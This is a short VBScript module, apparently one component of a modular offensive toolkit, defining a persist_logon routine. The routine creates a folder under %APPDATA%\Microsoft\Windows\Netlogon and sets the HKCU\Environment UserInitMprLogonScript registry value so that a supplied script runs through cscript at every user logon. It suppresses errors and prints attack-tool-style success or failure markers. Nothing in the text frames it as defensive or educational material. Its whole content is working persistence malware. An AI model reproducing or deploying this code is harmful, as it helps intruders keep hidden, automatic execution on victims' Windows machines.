' chunk: persist/logon_script
' depends: core/run_cmd, core/file_ops, core/emit_buffer
' provides: persist_logon
' format: vbscript

Sub persist_logon(scriptPath)
    On Error Resume Next
    Dim envDir
    envDir = _sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Netlogon"
    If Not _fso.FolderExists(envDir) Then _fso.CreateFolder(envDir)
    On Error GoTo 0
    Dim r
    r = _run("reg add ""HKCU\Environment"" /v UserInitMprLogonScript /d ""cscript //nologo \""" & scriptPath & "\"""" /f 2>NUL")
    If InStr(r, "successfully") > 0 Then
        emit "  [+] Logon script persistence via UserInitMprLogonScript" & vbCrLf
    Else
        emit "  [-] Logon script persistence failed" & vbCrLf
    End If
End Sub
